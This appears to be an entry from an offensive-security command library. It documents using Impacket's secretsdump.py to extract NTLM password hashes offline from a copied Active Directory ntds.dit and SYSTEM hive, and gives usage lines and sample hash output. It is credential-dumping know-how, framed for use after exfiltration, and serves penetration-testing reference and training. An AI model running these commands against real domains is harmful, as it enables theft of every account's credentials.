---
id: e69d8987-90e8-4190-b0bb-e1c05119a968
name: secretsdump-extract-ntds-local
type: command
executor: python
data: secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
output: null
created_at: '2023-04-06T03:56:03.954823+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-dumping
  - ad-attacks
verified: true
validated: true
---

# secretsdump-extract-ntds-local

## Command

```python
secretsdump.py -system $_SYSTEM_HIVE -ntds $_NTDS_FILE LOCAL
```

## Description

This command uses Impacket's secretsdump.py to locally extract NTLM hashes from copied ntds.dit and SYSTEM files without needing network access to the Domain Controller. Ideal for offline analysis after file exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -system $_SYSTEM_HIVE | Path to the SYSTEM registry hive file (provides boot keys) | Yes |
| -ntds $_NTDS_FILE | Path to the ntds.dit database file | Yes |
| LOCAL | Specifies local file processing (no remote target) | Yes |

## Examples

### Basic Usage

```python
secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
```

### Advanced Usage

```python
secretsdump.py -system ./hives/SYSTEM -ntds ./hives/ntds.dit LOCAL > hashes.txt
```

## Expected Output

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x...
[*] Dumping cached domain logon information (domain cache hashes)...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...

Success is indicated by listed usernames with nthash values (non-empty NTLM hashes).
